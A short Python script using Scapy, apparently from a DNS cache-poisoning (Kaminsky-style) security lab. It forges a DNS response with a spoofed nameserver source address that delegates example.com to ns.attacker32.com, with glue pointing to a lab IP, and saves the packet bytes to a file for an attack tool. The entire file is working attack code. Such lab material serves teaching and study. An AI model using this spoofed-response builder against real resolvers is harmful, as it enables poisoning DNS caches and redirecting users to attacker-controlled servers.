#!/usr/bin/python3
from scapy.all import *
# Construct the DNS header and payload

'''
name = 'twysw.example.com'
domain = 'ns.attacker32.com'
ns = '10.0.2.4'
Qdsec = DNSQR(qname=name)
Anssec = DNSRR(rrname=name, type='A', rdata='1.2.3.4', ttl=259200)
NSsec = DNSRR(rrname=domain, type='NS', rdata=ns, ttl=259200)
dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1,qdcount=1, ancount=1, nscount=1, arcount=0,qd=Qdsec, an=Anssec, ns=NSsec)
ip = IP(dst='10.0.2.5', src='10.0.2.8')
udp = UDP(dport=53, sport=46413, chksum=0)
pkt = ip/udp/dns

'''
name = 'twysw.example.com'
#name = 'example.com'
domain = 'example.com'
ns = 'ns.attacker32.com'
Qdsec = DNSQR(qname=name)
Anssec = DNSRR(rrname=name, type='A', rdata='1.1.2.2', ttl=259200)
NSsec1 = DNSRR(rrname=domain, type='NS', rdata=ns, ttl=259200)
NSsec2 = DNSRR(rrname=ns, type='A', rdata='10.0.2.4', ttl=259200)
dns = DNS(id=0xAAAA, aa=1, rd=1, qr=0,qdcount=1, ancount=1, nscount=2, arcount=0,qd=Qdsec, an=Anssec, ns=NSsec1/NSsec2)
# Construct the IP, UDP headers, and the entire packet
ip = IP(dst='10.0.2.5', src='199.43.133.53', chksum=0)
udp = UDP(dport=33333, sport=53, chksum=0)
pkt = ip/udp/dns

# Save the packet to a files
with open('ip_resp.bin', 'wb') as f:
    f.write(bytes(pkt))
